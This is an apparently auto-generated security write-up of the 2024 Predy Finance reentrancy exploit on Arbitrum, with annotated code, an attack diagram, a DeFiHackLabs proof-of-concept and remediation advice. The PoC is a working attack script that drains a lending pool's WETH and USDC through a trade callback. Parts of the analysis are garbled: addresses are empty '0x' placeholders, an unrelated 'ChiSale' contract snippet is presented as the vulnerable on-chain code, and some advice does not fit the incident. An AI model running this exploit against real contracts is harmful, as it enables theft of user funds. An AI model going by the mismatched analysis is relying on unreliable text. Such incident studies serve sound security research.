# Predy Finance — Reentrancy Attack via Uniswap V3 Callback Analysis

| Item | Details |
|------|------|
| **Date** | 2024-05-31 |
| **Protocol** | Predy Finance |
| **Chain** | Arbitrum |
| **Loss** | Unconfirmed |
| **Attacker** | [0x](https://arbiscan.io/address/0x) |
| **Attack Tx** | [0x](https://arbiscan.io/tx/0x) |
| **Vulnerable Contract** | [0x](https://arbiscan.io/address/0x) |
| **Root Cause** | Reentrancy attack via Uniswap V3 callback |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/PredyFinance_exp.sol) |

---
## 1. Vulnerability Overview

Predy Finance is a DeFi protocol operating on the Arbitrum chain that suffered a **callback / reentrancy** attack on 2024-05-31.
The attacker exploited a reentrancy attack via Uniswap V3 callback, causing approximately **unconfirmed** in damages.

### Core Vulnerability Summary
- **Classification**: Callback / Reentrancy
- **Impact**: Unconfirmed loss of protocol assets
- **Attack Vector**: Reentrancy attack

---
## 2. Vulnerable Code Analysis (❌/✅ Comments)

```solidity
// ❌ Example of vulnerable implementation
// Issue: Reentrancy attack via Uniswap V3 callback
// The attacker exploits this logic to gain illegitimate profit

// IPredyPool interface — functions vulnerable to Uniswap V3 callback reentrancy
interface IPredyPool {
    // ❌ Vulnerable: during trade execution, Uniswap V3 callback (uniswapV3SwapCallback) fires
    // Inside the callback, supply/withdraw can reenter with the same pairId
    // Position state is reused at an intermediate stage without nonReentrant
    function trade(
        TradeParams memory tradeParams,
        bytes memory settlementData
    ) external returns (TradeResult memory tradeResult);

    // ❌ Vulnerable: take can be re-called inside the callback → double withdrawal
    function take(bool isQuoteAsset, address to, uint256 amount) external;

    // ❌ Vulnerable: supply/withdraw allow reentrancy during trade callback
    function supply(uint256 pairId, bool isQuoteAsset, uint256 supplyAmount) external returns (uint256 finalSuppliedAmount);
    function withdraw(uint256 pairId, bool isQuoteAsset, uint256 withdrawAmount) external returns (uint256 finalBurnAmount, uint256 finalWithdrawAmount);
    function registerPair(AddPairLogic.AddPairParams memory addPairParam) external returns (uint256);
}

// ✅ Correct implementation: apply nonReentrant to the entire trade + callback flow
function safeTrade(
    IPredyPool.TradeParams memory tradeParams,
    bytes memory settlementData
) external nonReentrant returns (IPredyPool.TradeResult memory) {
    // ✅ Reentrancy prevention: block access to the same pairId during trade execution
    require(!pairLocked[tradeParams.pairId], "Trade: pair locked");
    pairLocked[tradeParams.pairId] = true;
    // ✅ Snapshot position state (cannot be modified during callback)
    uint256 positionSnapshot = getPositionValue(tradeParams.pairId);
    IPredyPool.TradeResult memory result = _executeTrade(tradeParams, settlementData);
    // ✅ Validate position after callback
    require(getPositionValue(tradeParams.pairId) >= positionSnapshot * MIN_HEALTH_RATIO / 1e18, "Trade: position unhealthy");
    pairLocked[tradeParams.pairId] = false;
    return result;
}
```

---
### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: UniswapV3Pool.sol
contract ChiSale {
    /// @dev Prevents calling a function from anyone except the address returned by IUniswapV3Factory#owner()
    modifier onlyFactoryOwner() {
        require(msg.sender == IUniswapV3Factory(factory).owner());  // ❌ Vulnerability
        _;
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ▼
[Initial Call] ─────── Vulnerable Contract
  │                      (before balance update)
  ▼
[Callback/Reentry] ──── Re-call same function
  │                      (state not yet updated)
  ▼
[Repeated Withdrawal] ── Until balance is drained
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// Source: DeFiHackLabs - PredyFinance_exp.sol
// Chain: Arbitrum | Date: 2024-05-31

    function testExploit() public balanceLog {
        USDC.approve(address(predyPool), type(uint256).max);
        WETH.approve(address(predyPool), type(uint256).max);

        //implement exploit code here
        AddPairLogic.AddPairParams memory addPairParam = AddPairLogic.AddPairParams({
            marginId: address(WETH),
            poolOwner: address(this),
            uniswapPool: address(0xC6962004f452bE9203591991D15f6b388e09E8D0),
            priceFeed: address(this),
            whitelistEnabled: false,
            fee: 0,
            assetRiskParams: Perp.AssetRiskParams({
                riskRatio: 100_000_001,
                debtRiskRatio: 0,
                rangeSize: 1000,
                rebalanceThreshold: 500,
                minSlippage: 1_005_000,
                maxSlippage: 1_050_000
            }),
            quoteIrmParams: InterestRateModel.IRMParams({
                baseRate: 10_000_000_000_000_000,
                kinkRate: 900_000_000_000_000_000,
                slope1: 500_000_000_000_000_000,
                slope2: 1_000_000_000_000_000_000
            }),
            baseIrmParams: InterestRateModel.IRMParams({
                baseRate: 10_000_000_000_000_000,
                kinkRate: 900_000_000_000_000_000,
                slope1: 500_000_000_000_000_000,
                slope2: 1_000_000_000_000_000_000
            })
        });
        uint256 pairId = predyPool.registerPair(addPairParam); // register pair, the owner of the pair is attack contract

        IPredyPool.TradeParams memory tradeParams =
            IPredyPool.TradeParams({pairId: pairId, vaultId: 0, tradeAmount: 0, tradeAmountSqrt: 0, extraData: ""});
        predyPool.trade(tradeParams, ""); // set the attack contract as the locker

        predyPool.withdraw(pairId, true, WETH.balanceOf(address(predyPool))); // withdraw the LP to the attacker
        predyPool.withdraw(pairId, false, USDC.balanceOf(address(predyPool))); // withdraw the LP to the attacker
    }

    function predyTradeAfterCallback(
        IPredyPool.TradeParams memory tradeParams,
        IPredyPool.TradeResult memory tradeResult
    ) external {
        predyPool.take(true, address(this), WETH.balanceOf(address(predyPool))); // take the asset to the attacker
        predyPool.supply(tradeParams.pairId, true, WETH.balanceOf(address(this))); // supply the asset as LP and bypass the check in the function PositionCalculator.checkSafe()

        predyPool.take(false, address(this), USDC.balanceOf(address(predyPool))); // take the asset to the attacker
        predyPool.supply(tradeParams.pairId, false, USDC.balanceOf(address(this))); // supply the asset as LP and bypass the check in the function finalizeLock()
    }

    function getSqrtPrice() external view returns (uint256) {
        return 40_000_000_000;
    }
}

library AddPairLogic {
```

> **Note**: The code above is a PoC for educational purposes. Refer to the original file in the DeFiHackLabs repository.

---
## 5. Vulnerability Classification (Table)

| Classification Criteria | Details |
|-----------|------|
| **DASP Top 10** | Reentrancy Attack |
| **Attack Type** | CEI Pattern Violation |
| **Vulnerability Category** | Logic Vulnerability |
| **Attack Complexity** | Medium |
| **Prerequisites** | Access to vulnerable function |
| **Impact Scope** | Partial assets |
| **Patchability** | High (resolvable via code fix) |

---
## 6. Remediation Recommendations

### Immediate Actions
1. **Pause vulnerable functions**: Apply emergency pause to affected functions
2. **Assess damage**: Quantify lost assets and identify affected users
3. **Notify relevant parties**: Immediately notify related DEXs, bridges, and security research teams

### Code Fixes
```solidity
// Recommendation 1: Reentrancy protection (use OpenZeppelin ReentrancyGuard)
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Fixed is ReentrancyGuard {
    function protectedFunction() external nonReentrant {
        // Safe logic
    }
}

// Recommendation 2: Follow CEI (Checks-Effects-Interactions) pattern
function safeWithdraw(uint256 amount) external {
    // 1. Checks: validate first
    require(balances[msg.sender] >= amount, "Insufficient balance");
    // 2. Effects: update state
    balances[msg.sender] -= amount;
    // 3. Interactions: external calls last
    token.transfer(msg.sender, amount);
}

// Recommendation 3: Oracle manipulation prevention (use TWAP)
function getSafePrice() internal view returns (uint256) {
    // ✅ Use short-term TWAP to prevent instantaneous price manipulation
    return oracle.getTWAP(30 minutes);
    // ❌ Do not rely solely on current spot price
}
```

### Long-Term Improvements
- Conduct **independent security audits** (at least 2 auditing firms)
- Operate a **bug bounty program**
- Establish a **monitoring system** (Forta, OpenZeppelin Defender, etc.)
- Implement an **emergency pause mechanism**

---
## 7. Lessons Learned

### For Developers
1. **Callback / reentrancy attacks are preventable**: Defensible with proper validation and pattern application
2. **Consider economic incentives**: All functions must be designed with the attacker's economic motivation in mind
3. **Audit priority**: Functions that directly handle assets are the highest-priority audit targets

### For Protocol Operators
1. **Real-time monitoring**: Establish systems to immediately detect abnormal large-scale transactions
2. **Incident response plan**: Maintain a response playbook that can be executed immediately upon attack
3. **Insurance coverage**: Distribute risk through DeFi insurance protocols

### For the DeFi Ecosystem at Large
- The **2024-05-31** Predy Finance incident reconfirms the danger of **callback / reentrancy** attacks in the Arbitrum ecosystem
- Similar protocols should immediately audit for the same vulnerability
- Strengthening community-level security information sharing is recommended

---
*This document was prepared for educational and security research purposes. Do not misuse.*
*PoC original: [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/PredyFinance_exp.sol)*